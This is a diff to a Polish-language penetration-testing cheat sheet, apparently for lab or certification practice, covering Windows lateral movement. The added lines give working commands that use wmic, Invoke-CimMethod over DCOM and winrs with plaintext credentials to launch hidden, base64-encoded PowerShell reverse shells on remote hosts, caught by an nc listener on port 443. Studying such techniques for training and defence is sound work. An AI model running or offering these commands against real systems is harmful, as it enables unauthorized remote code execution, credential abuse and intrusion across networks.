@@ -1966,8 +1966,20 @@ sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
 ```cmd
 :: jednolinijkowiec (wmic, przestarzały ale wszędzie działa); ReturnValue=0 = sukces, zwraca PID
 wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
+:: REVERSE SHELL — payload PowerShella zakodowany base64 (koder §7.1); listener nc -lvnp 443 PRZED:
+wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "powershell -nop -w hidden -e JABjAGwAaQBl...QAoACkA"
 ```
-> RPC na 135, dane sesji na 49152-65535. Proces startuje w Session 0. `wmic` przestarzały → preferuj metodę PowerShell CIM/DCOM poniżej. UAC-remote NIE dotyczy userów domenowych → masz pełne prawa do lateral.
+> RPC na 135, dane sesji na 49152-65535. Proces startuje w Session 0. `wmic` przestarzały → preferuj PowerShell CIM/DCOM poniżej. UAC-remote NIE dotyczy userów domenowych.
+
+**WMI reverse shell przez PowerShell (CIM/DCOM — nowoczesny odpowiednik):**
+```powershell
+$cred = New-Object System.Management.Automation.PSCredential('corp\jen',(ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force))
+$Opt  = New-CimSessionOption -Protocol DCOM
+$Sess = New-CimSession -ComputerName 192.168.50.73 -Credential $cred -SessionOption $Opt
+$b64  = "JABjAGwAaQBlAG4AdAA...QAoACkA"     # reverse shell zakodowany (§7.1)
+Invoke-CimMethod -CimSession $Sess -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell -nop -w hidden -e $b64"}
+# ReturnValue 0 = sukces; złap shell na nc -lvnp 443
+```
 
 ### WMI + MSI (135/5985, Administrators)
 ```bash
@@ -2006,7 +2018,10 @@ Invoke-Command -ComputerName files04 -Credential $cred -ScriptBlock { whoami }
 ### winrs (natywny klient WinRM, cmd)
 ```cmd
 winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
+:: REVERSE SHELL — wklej zakodowany payload PowerShella (base64 z kodera §7.1); listener nc -lvnp 443 PRZED:
+winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0A...QBlACgAKQA="
 ```
+> `winrs` działa tylko dla userów **domenowych** w grupie Administrators lub Remote Management Users (WinRM 5985/5986). Payload zakoduj koderem z §7.1 (UTF-16LE → base64).
 ### DCOM (lateral przez 135, gdy WinRM/SMB odpadają)
 ```powershell
 # a) MMC20.Application — wykonaj polecenie zdalnie (bez podawania creds, użyje Twojego tokenu):
